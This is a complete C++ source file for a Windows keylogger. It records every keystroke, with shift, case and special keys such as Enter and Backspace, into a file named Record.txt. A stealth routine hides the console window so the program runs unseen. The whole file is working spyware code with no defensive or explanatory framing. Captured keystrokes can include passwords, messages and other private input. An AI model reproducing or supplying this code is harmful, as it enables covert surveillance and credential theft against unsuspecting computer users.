#include <iostream>
#include<windows.h>
#include<winuser.h>
#include<fstream>

using namespace std;

void log();         // function which records the keystrokes
void stealth();     // function which makes the program invisible

int main()
{
	stealth();
	log();              
	return 0;
}

void log()
{
	char key;

	for(;;)           // creating an infinite loop
	{
		for( key = 8; key <= 222; key++)
		{
			if(GetAsyncKeyState(key) == -32767)       // checking for an interrupt when a key is pressed from the keyboard
			{
				ofstream write("Record.txt", ios::app);    // creating Record.txt file an openning it in append mode

				if( (key>64) && (key<91) && !(GetAsyncKeyState(0x10)))    // checking for lower case
				{
					key+=32;
					write << key;
					write.close();
					break;
				}
				else if( (key>64) && (key<91) )    // checking for upper case again
				{
					write << key;
					write.close();
					break;
				}
				else
				{
					switch(key)           // using switch case to check for numbers 0 to 9 as well as other characters assigned to the particular key
					{
						case 48:
						{
							if( GetAsyncKeyState(0x10) )    // using GetAsyncKeyState to check for the shift key
								write << ")";
							else
								write << "0";
						}
						break;
						case 49:
						{
							if( GetAsyncKeyState(0x10) )
								write << "!";
							else
								write << "1";
						}
						break;
						case 50:
						{
							if( GetAsyncKeyState(0x10) )
								write << "@";
							else
								write << "2";
						}
						break;
						case 51:
						{
							if( GetAsyncKeyState(0x10) )
								write << "#";
							else
								write << "3";
						}
						break;
						case 52:
						{
							if( GetAsyncKeyState(0x10) )
								write << "$";
							else
								write << "4";
						}
						break;
						case 53:
						{
							if( GetAsyncKeyState(0x10) )
								write << "%";
							else
								write << "5";
						}
						break;
						case 54:
						{
							if( GetAsyncKeyState(0x10) )
								write << "^";
							else
								write << "6";
						}
						break;
						case 55:
						{
							if( GetAsyncKeyState(0x10) )
								write << "&";
							else
								write << "7";
						}
						break;
						case 56:
						{
							if( GetAsyncKeyState(0x10) )
								write << "*";
							else
								write << "8";
						}
						break;
						case 57:
						{
							if( GetAsyncKeyState(0x10) )
								write << "(";
							else
								write << "9";
						}
						break;
						// using virtual keys to check for space, enter, tab, backspace, escape, delete and caps lock
						case VK_SPACE:
							write << " ";
						break;
						case VK_RETURN:
							write << "<ENTER>";
						break;
						case VK_TAB:
							write << "<TAB>";
						break;
						case VK_BACK:
							write << "<BACKSPACE>";
						break;
						case VK_ESCAPE:
							write << "<ESC>";
						break;
						case VK_DELETE:
							write << "<DEL>";
						break;
						case VK_CAPITAL:
							write << "<CAPS LOCK>";
						break;
						default: write << key;
					}
				}
			}
		}
	}
}

void stealth()
{
	HWND invisible;    // initialising a handler
	AllocConsole();
	invisible=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(invisible,0);    // setting the parameter to 0 means that the window would not be visible.
}
